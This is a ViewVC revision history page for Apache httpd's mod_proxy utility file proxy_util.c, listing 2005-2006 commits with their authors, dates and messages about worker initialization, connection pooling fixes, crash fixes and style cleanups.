```

---

Revision [**443503**](/viewvc?view=revision&revision=443503) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=443503&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=443503&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=443503))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=443503)

Modified
*Thu Sep 14 22:34:34 2006 UTC*
(18 years, 4 months ago)
by *rpluem*

File length: 73056 byte(s)

Diff to [previous 431339](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=431339&r2=443503)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=431339&r2=443503&diff_format=h))
```
* PROXY_WORKER_IS_INITIALIZED checks if PROXY_WORKER_INITIALIZED is set in
  worker->s->status, but we need to check here if it is set in worker->status.

  As PROXY_WORKER_INITIALIZED is set in worker->s->status in
  ap_proxy_initialize_worker_share, which is called just before
  ap_proxy_initialize_worker we never initialize the worker. This is very bad
  as we create no reslist for the pool in this case.

```

---

Revision [**431339**](/viewvc?view=revision&revision=431339) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=431339&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=431339&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=431339))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=431339)

Modified
*Mon Aug 14 13:26:07 2006 UTC*
(18 years, 5 months ago)
by *niq*

File length: 73050 byte(s)

Diff to [previous 429890](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=429890&r2=431339)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=429890&r2=431339&diff_format=h))
```
PR#37770: Don't try to use dead backend connection in proxy
(Patch from Olivier BOEL)

```

---

Revision [**429890**](/viewvc?view=revision&revision=429890) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=429890&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=429890&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=429890))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=429890)

Modified
*Tue Aug 8 23:50:33 2006 UTC*
(18 years, 5 months ago)
by *niq*

File length: 72999 byte(s)

Diff to [previous 429879](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=429879&r2=429890)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=429879&r2=429890&diff_format=h))
```
Fix tabs introduced in [r429875](/viewvc?view=revision&revision=429875)

```

---

Revision [**429879**](/viewvc?view=revision&revision=429879) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=429879&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=429879&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=429879))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=429879)

Modified
*Tue Aug 8 23:27:25 2006 UTC*
(18 years, 5 months ago)
by *niq*

File length: 72740 byte(s)

Diff to [previous 429875](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=429875&r2=429879)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=429875&r2=429879&diff_format=h))
```
PR#38448: don't URLencode tilde in path component
On reflection, this patch makes sense (since the URL spec got updated), and it's trivial.

```

---

Revision [**429875**](/viewvc?view=revision&revision=429875) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=429875&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=429875&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=429875))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=429875)

Modified
*Tue Aug 8 23:18:23 2006 UTC*
(18 years, 5 months ago)
by *niq*

File length: 72739 byte(s)

Diff to [previous 427959](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=427959&r2=429875)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=427959&r2=429875&diff_format=h))
```
Fix style (indentation at least) to apache style rules before reviewing top of this.
No functional change.

```

---

Revision [**427959**](/viewvc?view=revision&revision=427959) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=427959&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=427959&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=427959))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=427959)

Modified
*Wed Aug 2 12:03:42 2006 UTC*
(18 years, 5 months ago)
by *mturk*

File length: 70849 byte(s)

Diff to [previous 427055](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=427055&r2=427959)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=427055&r2=427959&diff_format=h))
```
Cleanup: Remove close_on_recycle from proxy_conn_rec.
It behaves the same as close.

```

---

Revision [**427055**](/viewvc?view=revision&revision=427055) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=427055&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=427055&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=427055))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=427055)

Modified
*Mon Jul 31 09:33:28 2006 UTC*
(18 years, 6 months ago)
by *mturk*

File length: 70910 byte(s)

Diff to [previous 421686](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=421686&r2=427055)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=421686&r2=427055&diff_format=h))
```
Cleanup: Remove checking for pre 2.0.46 MMN. It is
obvious that the new mod_proxy will never be
backported to the 2.0 branch.

```

---

Revision [**421686**](/viewvc?view=revision&revision=421686) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=421686&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=421686&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=421686))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=421686)

Modified
*Thu Jul 13 19:00:26 2006 UTC*
(18 years, 6 months ago)
by *niq*

File length: 71008 byte(s)

Diff to [previous 421283](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=421283&r2=421686)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=421283&r2=421686&diff_format=h))
```
Support environment variable interpolation in reverse proxy configuration

```

---

Revision [**421283**](/viewvc?view=revision&revision=421283) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=421283&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=421283&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=421283))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=421283)

Modified
*Wed Jul 12 15:01:15 2006 UTC*
(18 years, 6 months ago)
by *jim*

File length: 70215 byte(s)

Diff to [previous 420986](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=420986&r2=421283)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=420986&r2=421283&diff_format=h))
```
It never fails. I sit on a patch for awhile and
it's not until almost right after I commit it that
I think "hey, there's a better way to do that."
Anyway, I was never happy about the code
duplication of the primary/standby checks...
This fixes that.

```

---

Revision [**420986**](/viewvc?view=revision&revision=420986) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=420986&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=420986&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=420986))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=420986)

Modified
*Tue Jul 11 20:39:38 2006 UTC*
(18 years, 6 months ago)
by *jim*

File length: 70224 byte(s)

Diff to [previous 420983](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=420983&r2=420986)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=420983&r2=420986&diff_format=h))
```

Add in hot-standby balancer member. If all other members
are disabled or not-usable, ONLY THEN will the hot
standby's be used.

```

---

Revision [**420983**](/viewvc?view=revision&revision=420983) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=420983&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=420983&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=420983))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=420983)

Modified
*Tue Jul 11 20:33:53 2006 UTC*
(18 years, 6 months ago)
by *fielding*

File length: 70215 byte(s)

Diff to [previous 420954](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=420954&r2=420983)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=420954&r2=420983&diff_format=h))
```
update license header text

```

---

Revision [**420954**](/viewvc?view=revision&revision=420954) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=420954&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=420954&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=420954))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=420954)

Modified
*Tue Jul 11 19:32:36 2006 UTC*
(18 years, 6 months ago)
by *jim*

File length: 70068 byte(s)

Diff to [previous 395552](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=395552&r2=420954)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=395552&r2=420954&diff_format=h))
```
Clean up some proxy macros. Avoid the use of magic
numbers, and instead use pre-defined defines. Also,
ensure that usable workers have been initialized :)

Allocate a bit for hot standbys. Adjust so that
normal "usable" workers don't count these.

```

---

Revision [**395552**](/viewvc?view=revision&revision=395552) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=395552&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=395552&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=395552))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=395552)

Modified
*Thu Apr 20 10:35:41 2006 UTC*
(18 years, 9 months ago)
by *jorton*

File length: 70094 byte(s)

Diff to [previous 395228](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=395228&r2=395552)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=395228&r2=395552&diff_format=h))
```
* modules/proxy/proxy_util.c (ap_proxy_initialize_worker): Fix
gcc strict-aliasing warning.

```

---

Revision [**395228**](/viewvc?view=revision&revision=395228) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=395228&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=395228&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=395228))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=395228)

Modified
*Wed Apr 19 12:11:27 2006 UTC*
(18 years, 9 months ago)
by *colm*

File length: 70063 byte(s)

Diff to [previous 395180](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=395180&r2=395228)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=395180&r2=395228&diff_format=h))
```
Update the copyright year in all .c, .h and .xml files

```

---

Revision [**395180**](/viewvc?view=revision&revision=395180) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=395180&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=395180&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=395180))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=395180)

Modified
*Wed Apr 19 08:56:59 2006 UTC*
(18 years, 9 months ago)
by *martin*

File length: 70063 byte(s)

Diff to [previous 394390](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=394390&r2=395180)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=394390&r2=395180&diff_format=h))
```
Fix for platforms without threads: inreslist exists only if APR_HAS_THREADS is set

```

---

Revision [**394390**](/viewvc?view=revision&revision=394390) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=394390&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=394390&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=394390))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=394390)

Modified
*Sat Apr 15 22:45:00 2006 UTC*
(18 years, 9 months ago)
by *niq*

File length: 70009 byte(s)

Diff to [previous 394088](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=394088&r2=394390)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=394088&r2=394390&diff_format=h))
```
PR#39321 - don't segfault if a bad URL is specified in ProxyPass

```

---

Revision [**394088**](/viewvc?view=revision&revision=394088) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=394088&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=394088&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=394088))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=394088)

Modified
*Fri Apr 14 13:20:28 2006 UTC*
(18 years, 9 months ago)
by *rpluem*

File length: 69923 byte(s)

Diff to [previous 392613](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=392613&r2=394088)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=392613&r2=394088&diff_format=h))
```
* Avoid calling ap_proxy_http_cleanup twice as this releases a connection
  from the connection pool twice. This causes this connection to be present
  in the connection pool twice. Thus it may be used by different threads
  at the same time which causes many troubles (segfaults in this case).
  Furthermore implement a logic to prevent double releases to the connection
  pool if they are triggered by buggy code and log an error message in this
  case.

  - mod_proxy_http.c: remove double calls to ap_proxy_http_cleanup
  - proxy_util.c: Add logic to prevent double releases of a
    connection to the connection pool.

PR: 38793

```

---

Revision [**392613**](/viewvc?view=revision&revision=392613) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=392613&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=392613&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=392613))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=392613)

Modified
*Sat Apr 8 21:43:24 2006 UTC*
(18 years, 9 months ago)
by *rpluem*

File length: 69436 byte(s)

Diff to [previous 390210](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=390210&r2=392613)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=390210&r2=392613&diff_format=h))
```
* Check for an existing socket independant of an existing connection record.
  This ensures that requests handled by the '*' worker are sent to the correct
  backend server.

PR: 39253

```

---

Revision [**390210**](/viewvc?view=revision&revision=390210) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=390210&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=390210&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=390210))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=390210)

Modified
*Thu Mar 30 18:32:53 2006 UTC*
(18 years, 10 months ago)
by *jim*

File length: 69452 byte(s)

Diff to [previous 384580](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=384580&r2=390210)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=384580&r2=390210&diff_format=h))
```
Document the removal of the flushing bandaid to a
runtime param. Since other protocols might benefit
from this, remove the ajp_ prefixes, to make it
more generic looking.

```

---

Revision [**384580**](/viewvc?view=revision&revision=384580) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=384580&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=384580&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=384580))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=384580)

Modified
*Thu Mar 9 18:39:16 2006 UTC*
(18 years, 10 months ago)
by *jim*

File length: 69462 byte(s)

Diff to [previous 378032](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=378032&r2=384580)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=378032&r2=384580&diff_format=h))
```
Make AJP flushing admin configurable.

```

---

Revision [**378032**](/viewvc?view=revision&revision=378032) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=378032&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=378032&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=378032))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=378032)

Modified
*Wed Feb 15 16:44:42 2006 UTC*
(18 years, 11 months ago)
by *jim*

File length: 69364 byte(s)

Diff to [previous 377780](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=377780&r2=378032)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=377780&r2=378032&diff_format=h))
```
  *) mod_proxy: Fix KeepAlives not being allowed and set to
     backend servers. PR38602. [Ruediger Pluem, Jim Jagielski]

Also, document previous patch:
  *) Correctly initialize mod_proxy workers, which use a
     combination of local and shared datasets. Adjust logging
     to better trace usage. PR38403. [Jim Jagielski]

```

---

Revision [**377780**](/viewvc?view=revision&revision=377780) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=377780&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=377780&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=377780))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=377780)

Modified
*Tue Feb 14 17:35:36 2006 UTC*
(18 years, 11 months ago)
by *jim*

File length: 69702 byte(s)

Diff to [previous 377738](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=377738&r2=377780)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=377738&r2=377780&diff_format=h))
```
OK, handle better the initializing of worker, separating
"shared" and "local" inits, and being aware that if the
shared aspects are initialized, this doesn't mean
the local ones are :)

```

---

Revision [**377738**](/viewvc?view=revision&revision=377738) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=377738&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=377738&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=377738))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=377738)

Modified
*Tue Feb 14 14:55:02 2006 UTC*
(18 years, 11 months ago)
by *jim*

File length: 68978 byte(s)

Diff to [previous 366181](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=366181&r2=377738)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=366181&r2=377738&diff_format=h))
```
I wondered why I never saw the scoreboard init entry; now I know.
The logic flow was slightly askew.

```

---

Revision [**366181**](/viewvc?view=revision&revision=366181) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=366181&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=366181&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=366181))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=366181)

Modified
*Thu Jan 5 13:46:57 2006 UTC*
(19 years ago)
by *rpluem*

File length: 68792 byte(s)

Diff to [previous 365374](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=365374&r2=366181)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=365374&r2=366181&diff_format=h))
```
* If a subrequest has a broken backend also set no_cache for the main request
  and ensure that the chunk filter does not sent the last chunk marker in this
  case.

  modules/http/chunk_filter.c: Memorize HTTP_BAD_GATEWAY error buckets that
                               had been seen in filter context to ensure
                               that we do not sent the last chunk marker in
                               this case.
  modules/proxy/proxy_util.c : Set no_cache also for main request if we are
                               a subrequest.

  Thanks to Joe Orton and André Malo for the "invented unique pointer" trick.

```

---

Revision [**365374**](/viewvc?view=revision&revision=365374) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=365374&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=365374&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=365374))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=365374)

Modified
*Mon Jan 2 16:39:22 2006 UTC*
(19 years ago)
by *rpluem*

File length: 68643 byte(s)

Diff to [previous 356030](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=356030&r2=365374)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=356030&r2=365374&diff_format=h))
```
* Correctly signal broken backend connections up the chain also for the ajp
  backend (see also [r357461](/viewvc?view=revision&revision=357461)). Furthermore move common code in mod_proxy_http.c
  and mod_proxy_ajp.c into a new function (ap_proxy_backend_broke) in
  proxy_util.c.

  modules/proxy/mod_proxy_ajp.c : Signal broken backend connection for ajp backend
  modules/proxy/proxy_util.c    : Add ap_proxy_backend_broke
  modules/proxy/mod_proxy_http.c: - Use ap_proxy_backend_broke
                                  - Return DONE also if backend broke
  modules/proxy/mod_proxy.h     : Add declaration of ap_proxy_backend_broke

```

---

Revision [**356030**](/viewvc?view=revision&revision=356030) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=356030&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=356030&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=356030))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=356030)

Modified
*Sun Dec 11 21:36:27 2005 UTC*
(19 years, 1 month ago)
by *jim*

File length: 68190 byte(s)

Diff to [previous 350250](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=350250&r2=356030)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=350250&r2=356030&diff_format=h))
```
OK, while we ponder how best to reuse conn pools for workers,
clean this section up.

```

---

Revision [**350250**](/viewvc?view=revision&revision=350250) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=350250&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=350250&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=350250))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=350250)

Modified
*Thu Dec 1 13:50:11 2005 UTC*
(19 years, 1 month ago)
by *jim*

File length: 68326 byte(s)

Diff to [previous 350009](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=350009&r2=350250)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=350009&r2=350250&diff_format=h))
```
Until we determine whether we should dip into the connection
pool each time, rearrange the logic to avoid a double
check which is unneeded. No matter what (if it's reusable or
not) a null conn->hostname needs to be set. At that
point it doesn't matter if we're not reusing it or
if the string comparison happens, since what we
would do in that case has already been done.

```

---

Revision [**350009**](/viewvc?view=revision&revision=350009) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=350009&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=350009&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=350009))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=350009)

Modified
*Wed Nov 30 18:40:05 2005 UTC*
(19 years, 1 month ago)
by *jim*

File length: 68367 byte(s)

Diff to [previous 349723](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=349723&r2=350009)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=349723&r2=350009&diff_format=h))
```
Check that conn->hostname is valid before we do the string
comparison

```

---

Revision [**349723**](/viewvc?view=revision&revision=349723) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=349723&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=349723&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=349723))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=349723)

Modified
*Tue Nov 29 15:05:16 2005 UTC*
(19 years, 2 months ago)
by *jim*

File length: 68330 byte(s)

Diff to [previous 332306](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=332306&r2=349723)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=332306&r2=349723&diff_format=h))
```
Fix case where a shared keepalive connection results in
different workers from being accessed. Try to be wise and
fast about the tests before we do the expensive string
comparison.

```

---

Revision [**332306**](/viewvc?view=revision&revision=332306) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=332306&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=332306&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=332306))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=332306)

Modified
*Thu Nov 10 15:11:44 2005 UTC*
(19 years, 2 months ago)
by *jim*

File length: 67860 byte(s)

Diff to [previous 330085](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=330085&r2=332306)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=330085&r2=332306&diff_format=h))
```
No functional Change: Removing trailing whitespace. This also
means that "blank" lines consisting of just spaces or
tabs are now really blank lines

```

---

Revision [**330085**](/viewvc?view=revision&revision=330085) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=330085&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=330085&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=330085))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=330085)

Modified
*Tue Nov 1 16:15:09 2005 UTC*
(19 years, 2 months ago)
by *jim*

File length: 67894 byte(s)

Diff to [previous 329849](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=329849&r2=330085)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=329849&r2=330085&diff_format=h))
```
Move to a different impl which was my 1st concept and that which
Ruediger likes. Instead of adjusting pointers to areas
within the URL, simply copy it over and change it as needed.
Easier logic and not that much slower for normal cases.

```

---

Revision [**329849**](/viewvc?view=revision&revision=329849) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=329849&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=329849&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=329849))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=329849)

Modified
*Mon Oct 31 16:31:29 2005 UTC*
(19 years, 2 months ago)
by *jim*

File length: 68035 byte(s)

